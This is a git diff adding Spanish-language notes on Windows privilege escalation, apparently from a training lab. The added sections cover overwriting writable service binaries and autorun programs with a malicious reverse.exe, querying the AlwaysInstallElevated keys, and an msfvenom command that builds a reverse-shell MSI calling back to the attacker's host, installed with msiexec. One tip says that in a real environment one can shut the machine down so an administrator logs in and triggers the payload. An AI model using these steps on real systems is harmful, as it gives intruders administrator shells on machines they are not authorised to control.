@@ -57,7 +57,8 @@ copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
 ponemos un netcat en listener y corremos el servicio
 net start servicio
 
-################WEAK REGISTRY PERMISSIONS:
+##################### WEAK REGISTRY PERMISSIONS:
+
 Una vez identificado un servicio que corre con privilegios elevados, corremos el accesschk.exe para ver si nuestro user/grupo al que pertenece puede escribir entradas de registro:
 accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\servicio
 
@@ -67,7 +68,55 @@ reg add HKLM\SYSTEM\CurrentControlSet\services\service /v ImagePath /t REG_EXPAN
 Iniciamos un netcat como listener y corremos el servicio
 net start regsvc
 
-###############
+#################### INSECURE SERVICE EXECUTABLES
+
+Una vez que detectamos el servicio con privilegios elevados, nos fijamos con accesschk.exe si el binario del servicio es writeable por nuestro user/grupo.
+C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\servicio.exe"
+
+De tener permisos de escritura sobre el archivo, podemos reemplazarlo por nuestro archivo malicioso:
+copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\servicio.exe" /Y
+
+Luego corremos netcat y corremos el servicio.
+net start servicio
+
+
+
+#########################################################################REGISTRY
+
+
+################################### EXPLOIT AUTORUNS
+
+Buscamos en el registro ejecutables de autoruns
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
+usamos accesschk.exe para ver los permisos que tienen los autoruns
+accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\AUTORUN.exe"
+
+Si nuestro user/grupo tiene permisos de escritura sobre el autorun, lo reemplazamos por el archivo malicioso y reiniciamos la pc(en un entorno real es mejor apagarla para llamar la atención del admin y 
+que se loguee en la misma):
+copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
+
+abrimos netcat y esperamos a que alguien encienda la máquina y se loguee
+
+
+################################### ALWAYSINSTALLELEVATED 
+
+
+Hacemos una query al registro buscando las keys de Alwaysinstallelevated
+
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+si en ambos casos las keys están seteadas en 1 (0x1 == true)
+
+generamos un archivo malicioso .msi con una shell reversa y lo pasamos a la víctima:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=NUESTRA_IP LPORT=PUERTO -f msi -o reverse.msi
+
+lo instalamos y se nos va a generar una shell reversa con permisos de admin.
+msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
+
+
+
 
 
 
